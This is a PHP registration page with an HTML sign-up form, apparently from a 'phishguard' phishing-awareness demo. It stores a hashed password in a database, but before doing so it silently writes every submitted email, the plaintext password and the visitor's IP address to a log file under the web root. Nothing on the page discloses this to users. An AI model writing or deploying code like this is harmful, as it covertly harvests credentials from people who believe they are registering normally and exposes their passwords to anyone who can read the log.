<?php

include("db.php");

$message = "";

$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("Y-m-d H:i:s");

$log =
"====================================\n".
"Time: $time\n".
"Email: $email\n".
"Password Entered: ".$password."\n".
"Password Length: ".strlen($password)."\n".
"IP Address: $ip\n".
"Simulation: Phishing Awareness Demo\n".
"====================================\n\n";

file_put_contents(
    "/var/www/html/phishguard/register_log.txt",
    $log,
    FILE_APPEND
);


if($_SERVER["REQUEST_METHOD"] == "POST")
{
    $name = $_POST['name'];
    $email = $_POST['email'];
    $password = $_POST['password'];

    $hashedPassword =
    password_hash(
    $password,
    PASSWORD_DEFAULT
    );

    $stmt = $conn->prepare(
    "INSERT INTO users
    (name,email,password_hash)
    VALUES
    (?,?,?)"
    );

    $stmt->bind_param(
    "sss",
    $name,
    $email,
    $hashedPassword
    );

    if($stmt->execute())
    {
        $message = "Registration Successful";
    }
    else
    {
        $message = "Error: ".$stmt->error;
    }
}

?>

<!DOCTYPE html>
<html>

<head>

<title>Register</title>

<link rel="stylesheet" href="style.css">

</head>

<body class="register-page">

<div class="login-box">

<h2>Create Account</h2>
<img
src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png"
class="form-image">
<?php
if($message!="")
{
    echo "<p>$message</p>";
}
?>

<form method="POST" autocomplete="off">

<input
type="text"
name="name"
autocomplete="off"
placeholder="Full Name"
required>

<input
type="email"
name="email"
autocomplete="off"
placeholder="Email Address"
required>

<input
type="password"
name="password"
autocomplete="new-password"
placeholder="Password"
required>

<button type="submit">

Register

</button>

</form>

<br>

<p style="text-align:center;">

Already have an account?

<a href="login.php">

Login Here

</a>

</p>

</div>

</body>

</html>
